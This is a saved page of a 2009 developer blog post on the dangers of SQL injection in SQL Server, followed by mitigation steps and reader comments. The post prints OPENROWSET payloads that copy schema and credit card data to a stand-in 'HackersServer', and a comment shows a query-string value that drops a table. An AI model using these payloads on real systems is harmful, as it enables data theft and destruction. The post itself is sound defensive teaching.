@@ -1,0 +1,172 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head profile="http://gmpg.org/xfn/1">
+	<title>.NET Junkie - The true danger of SQL Injection Attacks</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<link rel="stylesheet" href="/blogs/steven/pivot/templates/layout12.css" type="text/css" />
+	<!--[if IE]>
+	<link rel="stylesheet" href="/blogs/steven/pivot/templates/layout7_ie.css" type="text/css" />
+	<![endif]-->
+	<!--[if !IE]>-->
+	<link rel="stylesheet" href="/blogs/steven/pivot/templates/layout7_ff.css" type="text/css" />
+	<!--<![endif]-->
+	<link rel="stylesheet" href="/blogs/steven/extensions/calendar/calendar.css" type="text/css" media="screen" />
+	<link rel="stylesheet" href="/blogs/steven/pivot/templates/mobile.css?changed=20121020a" type="text/css" />
+	<link rel="stylesheet" href="/blogs/steven/pivot/templates/print.css?changed=20110919" type="text/css" media="print" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/blogs/steven/rss.xml" />
+	<link rel="alternate" type="application/atom+xml" title="Atom" href="/blogs/steven/atom.xml" />
+	<style>
+		#NoJavascriptWarning {
+			width: 100%;
+			border: solid 3px red;
+			color: black;
+			padding: 3px;
+		}
+	</style>
+<script src="/blogs/steven/pivot/includes/js/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">
+<!--
+function UISjhckALxKVfQ(){ $('input[@name=post]').attr('disabled', ''); }
+function Frs(dg){var vT="0123456789abcdef";var str="";for(var i=0;i<dg.length*4;i++){str+=vT.charAt((dg[i>>2]>>((i%4)*8+4))&0xF)+vT.charAt((dg[i>>2]>>((i%4)*8))&0xF);}return str;} function vK(x,len){x[len>>5]|=0x80<<((len)%32);x[(((len+64)>>>9)<<4)+14]=len;var a=1732584193;var b=-271733879;var c=-1732584194;var d=271733878;for(var i=0;i<x.length;i+=16){var olda=a;var oldb=b;var oldc=c;var oldd=d;a=CuFv(a,b,c,d,x[i+0],7,-680876936);d=CuFv(d,a,b,c,x[i+1],12,-389564586);c=CuFv(c,d,a,b,x[i+2],17,606105819);b=CuFv(b,c,d,a,x[i+3],22,-1044525330);a=CuFv(a,b,c,d,x[i+4],7,-176418897);d=CuFv(d,a,b,c,x[i+5],12,1200080426);c=CuFv(c,d,a,b,x[i+6],17,-1473231341);b=CuFv(b,c,d,a,x[i+7],22,-45705983);a=CuFv(a,b,c,d,x[i+8],7,1770035416);d=CuFv(d,a,b,c,x[i+9],12,-1958414417);c=CuFv(c,d,a,b,x[i+10],17,-42063);b=CuFv(b,c,d,a,x[i+11],22,-1990404162);a=CuFv(a,b,c,d,x[i+12],7,1804603682);d=CuFv(d,a,b,c,x[i+13],12,-40341101);c=CuFv(c,d,a,b,x[i+14],17,-1502002290);b=CuFv(b,c,d,a,x[i+15],22,1236535329);a=sMT(a,b,c,d,x[i+1],5,-165796510);d=sMT(d,a,b,c,x[i+6],9,-1069501632);c=sMT(c,d,a,b,x[i+11],14,643717713);b=sMT(b,c,d,a,x[i+0],20,-373897302);a=sMT(a,b,c,d,x[i+5],5,-701558691);d=sMT(d,a,b,c,x[i+10],9,38016083);c=sMT(c,d,a,b,x[i+15],14,-660478335);b=sMT(b,c,d,a,x[i+4],20,-405537848);a=sMT(a,b,c,d,x[i+9],5,568446438);d=sMT(d,a,b,c,x[i+14],9,-1019803690);c=sMT(c,d,a,b,x[i+3],14,-187363961);b=sMT(b,c,d,a,x[i+8],20,1163531501);a=sMT(a,b,c,d,x[i+13],5,-1444681467);d=sMT(d,a,b,c,x[i+2],9,-51403784);c=sMT(c,d,a,b,x[i+7],14,1735328473);b=sMT(b,c,d,a,x[i+12],20,-1926607734);a=U(a,b,c,d,x[i+5],4,-378558);d=U(d,a,b,c,x[i+8],11,-2022574463);c=U(c,d,a,b,x[i+11],16,1839030562);b=U(b,c,d,a,x[i+14],23,-35309556);a=U(a,b,c,d,x[i+1],4,-1530992060);d=U(d,a,b,c,x[i+4],11,1272893353);c=U(c,d,a,b,x[i+7],16,-155497632);b=U(b,c,d,a,x[i+10],23,-1094730640);a=U(a,b,c,d,x[i+13],4,681279174);d=U(d,a,b,c,x[i+0],11,-358537222);c=U(c,d,a,b,x[i+3],16,-722521979);b=U(b,c,d,a,x[i+6],23,76029189);a=U(a,b,c,d,x[i+9],4,-640364487);d=U(d,a,b,c,x[i+12],11,-421815835);c=U(c,d,a,b,x[i+15],16,530742520);b=U(b,c,d,a,x[i+2],23,-995338651);a=NaTnN(a,b,c,d,x[i+0],6,-198630844);d=NaTnN(d,a,b,c,x[i+7],10,1126891415);c=NaTnN(c,d,a,b,x[i+14],15,-1416354905);b=NaTnN(b,c,d,a,x[i+5],21,-57434055);a=NaTnN(a,b,c,d,x[i+12],6,1700485571);d=NaTnN(d,a,b,c,x[i+3],10,-1894986606);c=NaTnN(c,d,a,b,x[i+10],15,-1051523);b=NaTnN(b,c,d,a,x[i+1],21,-2054922799);a=NaTnN(a,b,c,d,x[i+8],6,1873313359);d=NaTnN(d,a,b,c,x[i+15],10,-30611744);c=NaTnN(c,d,a,b,x[i+6],15,-1560198380);b=NaTnN(b,c,d,a,x[i+13],21,1309151649);a=NaTnN(a,b,c,d,x[i+4],6,-145523070);d=NaTnN(d,a,b,c,x[i+11],10,-1120210379);c=NaTnN(c,d,a,b,x[i+2],15,718787259);b=NaTnN(b,c,d,a,x[i+9],21,-343485551);a=F(a,olda);b=F(b,oldb);c=F(c,oldc);d=F(d,oldd);}return Array(a,b,c,d);} function viwyJufw(){var nmUSUhFgv = 40; nmUSUhFgv += 0; nmUSUhFgv += 1; nmUSUhFgv += 2; nmUSUhFgv += 3; nmUSUhFgv += 4; nmUSUhFgv += 5; nmUSUhFgv += 6; nmUSUhFgv += 7; nmUSUhFgv += 8; nmUSUhFgv += 9; nmUSUhFgv += 10; nmUSUhFgv += 11; nmUSUhFgv += 12; nmUSUhFgv += 13; nmUSUhFgv += 14; nmUSUhFgv += 15; nmUSUhFgv += 16; nmUSUhFgv += 17; nmUSUhFgv += 18; nmUSUhFgv += 19; nmUSUhFgv += 20; nmUSUhFgv += 21; nmUSUhFgv += 22; nmUSUhFgv += 23; nmUSUhFgv += 24; nmUSUhFgv += 25; nmUSUhFgv += 26; nmUSUhFgv += 27; nmUSUhFgv += 28; nmUSUhFgv += 29; nmUSUhFgv += 30; nmUSUhFgv += 31; nmUSUhFgv += 32; nmUSUhFgv += 33; nmUSUhFgv += 34; nmUSUhFgv += 35; nmUSUhFgv += 36; nmUSUhFgv += 37; nmUSUhFgv += 38; nmUSUhFgv += 39; nmUSUhFgv += 40; nmUSUhFgv += 41; nmUSUhFgv += 42; nmUSUhFgv += 43; nmUSUhFgv += 44; nmUSUhFgv += 45; nmUSUhFgv += 46; nmUSUhFgv += 47; nmUSUhFgv += 48; nmUSUhFgv += 49; nmUSUhFgv += 50; nmUSUhFgv += 51; nmUSUhFgv += 52; nmUSUhFgv += 53; nmUSUhFgv += 54; nmUSUhFgv += 55; nmUSUhFgv += 56; nmUSUhFgv += 57; nmUSUhFgv += 58; nmUSUhFgv += 59; nmUSUhFgv += 60; nmUSUhFgv += 61; nmUSUhFgv += 62; nmUSUhFgv += 63; nmUSUhFgv += 64; nmUSUhFgv += 65; nmUSUhFgv += 66; nmUSUhFgv += 67; nmUSUhFgv += 68; nmUSUhFgv += 69; nmUSUhFgv += 70; nmUSUhFgv += 71; return nmUSUhFgv; }  function NaTnN(a,b,c,d,x,s,t){return wnwiX(c ^(b|(~d)),a,b,x,s,t);} function U(a,b,c,d,x,s,t){return wnwiX(b ^ c ^ d,a,b,x,s,t);} function sMT(a,b,c,d,x,s,t){return wnwiX((b&d)|(c&(~d)),a,b,x,s,t);} function JcERmTQlokGT(s){return Frs(vK(lCSr(s),s.length*8));} function wnwiX(q,a,b,x,s,t){return F(tZCHP(F(F(a,q),F(x,t)),s),b);}function CuFv(a,b,c,d,x,s,t){return wnwiX((b&c)|((~b)&d),a,b,x,s,t);} function xXnlpRCAvr(icBdKBwPSFcrkZE){ pSyNkLbs = document.getElementById("YXrZrJxW"); if(!pSyNkLbs){ return false; } else { pSyNkLbs.name = JcERmTQlokGT(icBdKBwPSFcrkZE); pSyNkLbs.value = viwyJufw(); return true; }} function lCSr(LaH){var VI=Array();var Uoksre=(1<<8)-1;for(var i=0;i<LaH.length*8;i+=8)VI[i>>5]|=(LaH.charCodeAt(i/8)&Uoksre)<<(i%32);return VI;} function tZCHP(num,cnt){return(num<<cnt)|(num>>>(32-cnt));} function F(x,y){var lsw=(x&0xFFFF)+(y&0xFFFF);var msw=(x>>16)+(y>>16)+(lsw>>16);return(msw<<16)|(lsw&0xFFFF);}
+$(document).ready(function(){ setTimeout("UISjhckALxKVfQ()", 100); });
+// -->
+</script>
+
+</head>
+<script type="text/javascript" src="/blogs/steven/pivot/templates/includes5.js"></script>
+<script type="text/javascript">runAfterHead('/blogs/steven/pivot/templates/');</script>
+<body>
+	<div id="page">
+		<div id="header">
+			<h1><a href="/blogs/steven/index.php" title=".NET Junkie">.NET Junkie</a></h1>
+			<div class="description">Weblog of a workaholic</div>
+		</div>
+		
+		<hr />
+		
+		<div id="content" class="narrowcolumn">
+			<div class="post">
+				<span class="printpost">
+					<a	title="Show a printer-friendly version of this page"
+						target="_new"
+						href="http://www.cuttingedge.it/blogs/steven/pivot/entry.php?id=44&print=true">
+						<img alt="Print" src="/blogs/steven/pivot/templates/images/print.gif" />
+					</a>
+				</span>
+				<div class="entry" id="entry">
+					<span class="entrydate">14 January 09</span>
+					<h3><a href="http://www.cuttingedge.it/blogs/steven/pivot/entry.php?id=44">The true danger of SQL Injection Attacks</a></h3>
+			
+					<h4>This article describes the true danger of SQL injection attacks. The article shows how a hacker can steal your sensitive business data, even when your website connects to your database with a normal non-privileged login account.</h4>
+					
+					<div id="entry_body">
+						<a id="body"></a><p>Often when I visit customers, I warn their developers about the danger of SQL injection attacks and the importance of good database security. Many developers think they are safe because:</p><ul><li>They don't return (SQL) error messages to the browser.</li><li>They log error messages to the windows event log.</li><li>They use stored procedures.</li><li>They don't connect to the database using the 'sa' (administrator) account.</li></ul><p>This however is a false sense of security. In this article I will show you how a hacker can exploit a SQL injection vulnerability to steal your sensitive data. This goes for SQL Server 2000 in particular, which has a pretty unsafe default configuration, leaving your server open to exploitation quite easily, as I will show next.</p><h5>Hacking SQL Server Using OpenRowset</h5><p>Hackers can exploit a hole in your website to inject SQL code into SQL Server. The most popular way to do this is by inserting code in the query string, but there are of course several ways to do this. If you are not familiar with SQL Injection attacks, <a rel="external" href="http://en.wikipedia.org/wiki/SQL_injection" title="Wikipedia - SQL injection">this</a> Wikipedia article has a good definition.&nbsp; Most developers however, don't realize what the dangers are of such a leak. A hacker, that finds a SQL injection vulnerability, might inject the following SQL code into your SQL Server database:</p><pre><font color="#0000ff">INSERT INTO OPENROWSET</font>(<font color="#ff0000">'SQLoledb'</font>,<br /><font color="#ff0000">'server=HackersServer;uid=sa;pwd=hackersPwd'</font>, <br /><font color="#ff0000">'select * from hacked_tables'</font>)<br /><font color="#0000ff">SELECT </font>* <font color="#0000ff">FROM<font color="#008000"> </font></font><font color="#008000">sys.objects</font><br /><br /><font color="#0000ff">INSERT INTO OPENROWSET</font>(<font color="#ff0000">'SQLoledb'</font>,<br /><font color="#ff0000">'server=HackersServer;uid=sa;pwd=hackersPwd'</font>, <br /><font color="#ff0000">'select * from hacked_columns'</font>)<br /><font color="#0000ff">SELECT </font>* <font color="#0000ff">FROM<font color="#008000"> </font></font><font color="#008000">sys.columns</font><br /></pre><p>Let's analyze what happened here. The <a rel="external" href="http://msdn.microsoft.com/en-us/library/ms190312.aspx" title="MSDN - OPENROWSET (Transact-SQL)"><span class="keyword">OPENROWSET</span></a> function allows access to a remote data source. SQL Server calls this an <em>ad hoc distributed query</em>. When your SQL Server is connected to the internet, using this construct, the hacker can open a connection to his own server. Please don't think you can stop this by disallowing SQL Server port 1433 on your firewall; The hacker can use any port he wants. The hacker can use the <span class="keyword">OPENROWSET</span> command to &lsquo;ping&rsquo; his own server to find out if his SQL injection has any effect. This way he doesn't need any error messages returned from the web server to find out if the SQL injection succeeded.<br /><br />With the two <span class="keyword">INSERT</span> statements shown above, the hacker inserted the definition of all your database objects (such as tables and views) and their columns into his own database. The hacker can than use this information to rebuild the definition of your database on his own server and copy all the data from the hacked server to his own. The next step is to copy (all your sensitive business) data to the remote server. The query below is an example of what the hacker could execute:</p><pre><font color="#0000ff">INSERT INTO OPENROWSET</font>(<font color="#ff0000">'SQLoledb'</font>,<br /><font color="#ff0000">'server=HackersServer;uid=sa;pwd=hackersPwd'</font>, <br /><font color="#ff0000">'select * from hacked_creditcardnumbers'</font>)<br /><font color="#0000ff">SELECT </font>* <font color="#0000ff">FROM </font>creditcardnumbers<br /></pre><p>After the hacker finds out that your database contains a table named &lsquo;creditcardnumbers&rsquo;, the hacker can create a table named 'hacked_creditcardnumbers' in his own database, after which he will execute the given statement. He could (and probably will) repeat this for all (interesting) tables in your database.<br /><br />To be clear about this: The <span class="keyword">OPENROWSET</span> functionality is enabled by default in SQL Server 2000 can be used by normal database logins with no particular rights (you don&rsquo;t have to be logged in as a database owner or system administrator for this to work). With SQL Server 2005, Microsoft has disabled this feature by default, but you should make sure that this feature is disabled on your server. I will show at the end of this article how to disable this feature. I hope you see that &ndash;especially with the ad hoc distributed query functionality&ndash; a single SQL injection vulnerability could easily be exploited by a hacker to copy your very sensitive business data!<br /><br />But it could easily get worse, (and that's the case) when you actually did connect to your database using the &lsquo;sa&rsquo; user. &lsquo;sa&rsquo; Privileges allow someone to execute stored procedures like <a rel="external" href="http://msdn.microsoft.com/en-us/library/ms175046.aspx" title="MSDN - xp_cmdshell (Transact-SQL)">xp_cmdshell</a> and <a rel="external" href="http://www.mssqlcity.com/FAQ/Devel/xp_regwrite.htm" title="mssqlcity.com - How do I write to the registry via Transact-SQL?">xp_regwrite</a>. These procedures allow you to execute literally any program from the file system and change anything in the windows registry. The hacker could even download any binary file from his own server, store it on the database server&rsquo;s file system, register it through the windows register and run it! Please note that while running within the context of the system administrator account, a hacker can also re-enable the ad hoc distributed query functionality and (again) start copying the data.<br /><br />Let's make it clear: <strong>The hacker will have full control over your server</strong> when he exploits a vulnerability in the context of the system administrator (sa) user account! <br /><br />To make things worse; When connected to the database using a non-privileged login account, it could still be possible that the hacker exploits a known or unknown SQL server vulnerability to elevate privileges to gain full control. While the security of SQL Server (or any database servers by any other vendor that is) is getting better, those flaws <a rel="external" href="http://www.networkworld.com/news/2008/122308-microsoft-warns-of-sql.html" title="Network World - Microsoft warns of SQL attack - 12/23/2008">still</a> pop-up.<br /><br />The bottom line is: please don&rsquo;t underestimate SQL injection attacks, because a single successful injection could lead to a compromised server and theft of sensitive business data. You don&rsquo;t want to be the developer responsible for this exploited leak.</p><h5>Mitigating The Risks</h5><p>Now that we know the dangers, here are 6 steps that help you mitigate the risks.</p><h6>Step 1<a name="Step1" title="Step1"></a></h6><p>Never connect to the database using the &lsquo;sa&rsquo; account. Use a custom account and give it just enough rights. Personally, I prefer a security model where each application role gets it&rsquo;s own SQL login with only the rights it needs. This is not always feasible, for instance when the rights of each role are very dynamic and must be configurable.</p>  <h6>Step 2<a name="Step2" title="Step2"></a></h6>  <p>Make sure it&rsquo;s impossible to execute ad hoc distributed queries, like the ones shown above. SQL Server 2005 has disabled this by default, but SQL Server 2000 hasn&rsquo;t. Note that this configuration is at server level only. Unfortunately it&rsquo;s not an account policy. When you need ad hoc queries, I advise you to temporarily enable them, run your query, and disable them again. This limits the time frame an attacker could abuse it. And again, disabling this feature is useless when your application connects to the database using the &lsquo;sa&rsquo; account.</p> <p>To check whether ad hoc distributed queries are enabled, run the following query:</p>  <pre><font color="#0000ff"><font color="#993300">SP_CONFIGURE</font> </font><font color="#ff0000">'Ad Hoc Distributed Queries</font><font color="#ff0000">'</font><br /></pre>  <p>The columns &lsquo;config_value&rsquo; and &lsquo;run_value&rsquo; of the stored procedures results set should have a value of 0. Otherwise run this query to correct it:</p><pre><font color="#0000ff"><font color="#993300">SP_CONFIGURE</font> </font><font color="#ff0000">'Ad Hoc Distributed Queries</font><font color="#ff0000">'<font color="#000000">, 0</font></font></pre><p>After you disabled the ad hoc distributed queries functionality, you should get the following error message when executing the articles first query:</p><blockquote><font color="#ff0000">Msg 15281, Level 16, State 1, Line 1<br />SQL Server blocked access to STATEMENT 'OpenRowset/OpenDatasource' of component 'Ad Hoc Distributed Queries' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'Ad Hoc Distributed Queries' by using sp_configure. For more information about enabling 'Ad Hoc Distributed Queries', see &quot;Surface Area Configuration&quot; in SQL Server Books Online.</font><br /></blockquote>  <h6>Step 3<a name="Step3" title="Step3"></a></h6>  <p>Optionally use automated tooling to check for vulnerabilities in your code base. The integrated code analysis of Visual Studio 2010 for instance, <a rel="external" href="http://blogs.msdn.com/fxcop/archive/2008/10/30/new-code-analysis-features-in-visual-studio-2010-september-08-ctp.aspx" title="The Visual Studio Code Analysis Team Blog - New Code Analysis Features in Visual Studio 2010 September '08 CTP">will</a> have rules for finding SQL injection vulnerabilities.</p>  <h6>Step 4<a name="Step4" title="Step4"></a></h6>  <p>Make sure you log every exception to a data store and view logged events on a regular basis. When you&rsquo;re looking for a simple and pluggable logging framework for .NET, please take a look at <a rel="external" href="http://logging.codeplex.com" title="CuttingEdge.Logging - a simple and pluggeble logging framework for .NET 2.0">CuttingEdge.Logging</a>. When you log exceptions to a database, give logins only insert rights to the log table to prevent a hacker from erasing his tracks.</p>  <h6>Step 5<a name="Step5" title="Step5"></a></h6>  <p>Create security guidelines and an application architecture that protects you against injection attacks (and other security risks). Those guidelines should at least state that <a rel="external" href="http://davidhayden.com/blog/dave/archive/2005/10/24/2528.aspx" title="David Hayden - SQL Injection Attacks - Parameterized Queries - Regular Expressions - ASP.NET Security Best Practices">parameterized queries</a> should be used as much as possible (if not always).</p>  <h6>Step 6<a name="Step6" title="Step6"></a></h6>  <p>Use code reviews to find flaws in your software before it is released. This is very important, because you can&rsquo;t fully rely on automated tools or your database security configuration. Please use parameterized queries as much as possible and also review your stored procedures, because they are also vulnerable to injection attacks. Also make sure you avoid <a rel="external" href="http://msdn.microsoft.com/en-us/magazine/cc163523.aspx" title="MSDN - SQL Security - New SQL Truncation Attacks And How To Avoid Them">SQL Truncation attacks</a>.</p><h6>More information<a name="MoreInformation" title="MoreInformation"></a></h6><p>You can find detailed information about SQL Injection using ad hoc distributed queries in the following PDF document: <a rel="external" href="http://www.appsecinc.com/presentations/Manipulating_SQL_Server_Using_SQL_Injection.pdf" title="Application Security, Inc. - Manipulating Microsoft SQL Server Using SQL Injection">Manipulating Microsoft SQL Server Using SQL Injection</a>.</p><p>Good luck!</p>
+					</div>
+					
+					<div id="listOfLinks"></div>
+					
+					<p class="info dontPrint">
+						<span class="poster"><script type="text/javascript">
+<!--
+	var first = 'ma';
+	var second = 'il';
+	var third = 'to:';
+	var address = '';
+	var domain = '&#115;&#116;&#101;&#118;&#101;&#110;&#32;&#97;&#116;&#32;&#116;&#104;&#105;&#115;&#32;&#100;&#111;&#109;&#97;&#105;&#110;';
+	document.write('<a href="');
+	document.write(first+second+third);
+	document.write(address);
+	document.write('&#64;');
+	document.write(domain);
+	document.write('" title="Email Steven">');
+	document.write('Steven<\/a>');
+// -->
+</script></span> - <span class="category"><a href="/blogs/steven/pivot/archive.php?c=Databases">Databases</a>, <a href="/blogs/steven/pivot/archive.php?c=Security">Security</a>, <a href="/blogs/steven/pivot/archive.php?c=SQL">SQL</a></span> - 
+						<span class="comments"><a href="/blogs/steven/pivot/entry.php?id=44#comm" title="Luke, HendrikD, Menno, matthew_of_cambridge, Steven, Matthew Slyman">six comments</a> /  <a href="/blogs/steven/pivot/entry.php?id=44#track" title="">No trackbacks</a></span> - 
+						<a href="/blogs/steven/archives/archive_2009-m01.php#e44" title="Permanent link to 'The true danger of SQL Injection Attacks' in the archives">&sect;</a> <a href="/blogs/steven/pivot/entry.php?id=44" title="Permanent link to entry 'The true danger of SQL Injection Attacks'">&para;</a> 
+					</p>
+					
+					<div id="NoJavascriptWarning">
+						The code samples on my weblog are colorized using javascript, but
+						you disabled javascript (for my website) on your browser. 
+						If you're interested in viewing the posted code snippets in 
+						color, please enable javascript.
+					</div>
+					<script type="text/javascript">
+						var noScriptWarning = document.getElementById('NoJavascriptWarning');
+						noScriptWarning.style.display = "none";
+					</script>
+				</div>
+			</div>
+			
+			<hr style="height:1px; background-color:#999; color:#999; border: none;" />
+
+			<p><b>six comments:</b></p>
+			<div class="comments">
+			<a id="comm"></a>
+<p>An excellent posting. Particularly the emphasis on the powerful OPENROWSET command.<br /><small><b>Luke</b>   - 15 01 09 - 12:45 </small></p>
+<p>Holy shit! I didn't know that. I let our dba change the configuration of our production database, because we were indeed open to this attack. Thanks for the posting.<br /><small><b>HendrikD</b>   - 18 01 09 - 14:08 </small></p>
+<p>Thanks for the article! Keep 'm coming.<br /><small><b>Menno</b>   - 05 02 09 - 16:40 </small></p>
+<a id="lastcomment"></a><p>OK - SQL injection attacks are slightly more powerful than I realised.  Thanks for pointing out OpenRowSet and such like - worth knowing...  Still - none of this changes the fact that you cannot do SQL injection unless you are either logged in to an SQL Server instance or otherwise have access to a user-interface that has a connection to an SQL Server instance.<br />
+<br />
+<i>"Personally, I prefer a security model where each application role gets it’s own SQL login with only the rights it needs"</i><br />
+<br />
+We have been doing this for a while with SQL Server security/ users.<br />
+<br />
+<i>"This is not always feasible, for instance when the rights of each role are very dynamic and must be configurable."</i><br />
+<br />
+This is why you implement front-end user accounts using your own db schema and front-end code...  IN many industrial situations, front-end user accounts are related closely to records stored in your [bespoke] database, so it's too hard to implement end-user accounts as SQL Server user accounts anyway (as well as being reckless.)  It's often easier to do it yourself in your own code, => Less SQL Server user accounts to audit and easier to notice if anything funny starts happening.<br />
+<br />
+You say <i>"beware of SQL injection/ truncation attacks"</i> yet make no mention of the possibility of escape-encoding strings before including them in dynamically generated SQL; but I guess you can't mention everything or this would be a book, not a blog.<br />
+<br />
+Bottom line- don't install a web server on your main db server, or even on the same network for that matter.  Replicate a heavily cut down version of your main DB to an offsite web server via an encrypted link and then apply all the usual security strategies to that, e.g. for input validation, input processing etc. Criticisms?<br /><small><b>matthew_of_cambridge</b>  (<a href='http://www.slymandata.com/'  title='www.slymandata.com/'>URL</a>) - 30 07 09 - 13:33 </small></p>
+<p>Hi Matthew,<br />
+<br />
+<i>"none of this changes the fact that you cannot do SQL injection unless you are either logged in to an SQL Server instance or otherwise have access to a user-interface that has a connection to an SQL Server instance."</i><br />
+<br />
+It depends on what you see as 'logged in to an SQL Server'. SQL injection happens the most on web applications (while possible without web apps), so this is the main scenario I think and talk about (but I realize I don't speak about this in my blog). In a web scenario, the end user is (hopefully) never directly connected to the database. A web server sits in between the two. Therefore the web server communicates with the database and is 'logged in' to the database server (at least, as I see it). So while the user isn't logged in to the database, or perhaps even not logged into the web application, she is able to send data to the web server that could be used in a SQL injection attack. For instance, when an attacker changes the query string value (for instance, <b>page.aspx?id=3</b> becomes <b>page.aspx?id=3;DROP%20TABLE%20Users</b>).<br />
+<br />
+When I advise "<i>a security model where each application role gets it's own SQL login</i>" I'm not saying that all users of the system should get an unique database account. When a system has a large amount of users this would become unmanageable. What I advise is when your system has a couple of different roles (e.g. Administrator, Manager, SalesPerson, User, etc) you could define for each role a single database account and connect to the database with the account where that particular user belongs to. So for hundreds of users, you should only have up to a dozen of database accounts.<br />
+ <br />
+Note however, that I'm always talking about a three-tier environment (client -> server -> database). From a security perspective I hardly ever advice a two-tier model, where the client (desktop) application connects directly to the database, without a (web) server in between. Please note that when you create an end user (desktop) application that connects directly to a database server, talking about SQL injection is useless, because the end user can connect directly to the database and execute any arbitrary query, without abusing SQL injection.<br />
+<br />
+<i>"You say "beware of SQL injection/ truncation attacks" yet make no mention of the possibility of escape-encoding strings before including them in dynamically generated SQL"</i><br />
+<br />
+That's true. I don't talk about escaping for two reasons. First, it is because I expect everybody reading my blog to know about this, and for the people who don't, I linked to a Wikipedia article explaining SQL injection (it also explains escaping). Second reason is because I don't believe in escaping by hand and think it should be prevented as much as possible. Escaping by hand can be very error-prone. For instance, escaping the ' [quote] character to \' alone isn't sufficient when working with MySQL databases. I recommend the use of parameterized queries (step 5 and 6) to prevent yourself from SQL injection. Of course this advice is based on the assumption that you’re working in a .NET environment. Not all environment have the notion of parameterized queries.<br />
+<br />
+<i>"Bottom line- don't install a web server on your main db server, or even on the same network for that matter.  Replicate a heavily cut down version of your main DB to an offsite web server via an encrypted link and then apply all the usual security strategies to that, e.g. for input validation, input processing etc."</i><br />
+ <br />
+From a performance perspective mixing database and web server, isn't advised. From security neither, but I'm not a system administrator. About copying your database, it depends on your architecture and type of system if this possible at all. When you have a website where users only view data and aren't able to CUD (Create, Update, Delete) data, then copying could be a nice security mechanism. I must say I've never advised my clients to do so, but if that works in your situation, than that's perfect. Your OLTP system will be separated from the outside world; that's great.<br /><small><b>Steven</b>  (<a href='http://www.cuttingedge.it/blogs/steven/'  title='www.cuttingedge.it/blogs/steven/'>URL</a>) - 11 08 09 - 13:49 </small></p>
+<p>Thank you for your reply!<br />
+<br />
+&quot;I don't believe in escaping by hand and think it should be prevented as much as possible. Escaping by hand can be very error-prone.&quot; - I agree, and I try to mitigate the possibility of errors here.  My approach here (since I don't work in a .NET environment) is either:<br />
+<br />
+1. For Access unbound forms, enumerate all possible SQL delimiters in the relevant dialect of SQL.  I write standard functions to escape these characters for various data types.  Wherever user-generated data are used in SQL queries, I pass them through these standard functions.  Additionally, I use field-level data validation to exclude certain substrings from being inserted into fields that might be re-used in SQL queries.<br />
+<br />
+2. For PHP, I use a different approach...  I have standard objects and functions that generate forms and process the returned REQUEST data.  Type enforcement, validation and escaping routines are associated with these form objects.  Everything coming through the browser or via REQUEST data must pass through these routines...  SO in this case it is impossible to forget to escape the user-generated content.  (I might in future write something similar for Access unbound forms.)<br />
+<br />
+===<br />
+<br />
+From BBC news this morning:<br />
+<a href="http://news.bbc.co.uk/1/hi/world/americas/8206305.stm">http://news.bbc.co.uk/1/hi/world/america..</a><br />
+Apparently using SQL injection attack...<br />
+<br />
+It seems in every respect like this attack method is not going away any time soon.  It's a wonder that big companies can still leave their systems open to this.<br /><small><b>Matthew Slyman</b>  (<a href='http://www.slymandata.com/'  title='www.slymandata.com/'>URL</a>) - 18 08 09 - 13:01 </small></p>
+
+			</div>
+
+		</div>
+
+		<hr />
+		
+		<div id="footer">
+			<p>&copy; 2007-2019 Steven van Deursen.<br /><span class="dontPrint"><a href="/blogs/steven/rss.xml" title="XML: RSS Feed" rel="nofollow external" class="badge"><img src="/blogs/steven/pivot/pics/rssbutton.png" width="94" height="15" alt="XML: RSS Feed" class="badge" longdesc="/blogs/steven/rss.xml" /></a> <a href="/blogs/steven/atom.xml" title="XML: Atom Feed" rel="nofollow external" class="badge"><img src="/blogs/steven/pivot/pics/atombutton.png" width="94" height="15" alt="XML: Atom Feed" class="badge" longdesc="/blogs/steven/atom.xml" /></a></span>
+			</p>
+		</div>
+	</div>
+</body>
+<script type="text/javascript" src="/blogs/steven/pivot/templates/CSharpCodeHighlighter0.10.js"></script>
+<script type="text/javascript" src="/blogs/steven/pivot/templates/MSILCodeHighlighter0.1.js"></script>
+<script type="text/javascript" src="/blogs/steven/pivot/templates/X86CodeHighlighter0.1.js"></script>
+<script type="text/javascript">runAfterBody('/blogs/steven/pivot/templates/');</script>
+</html>
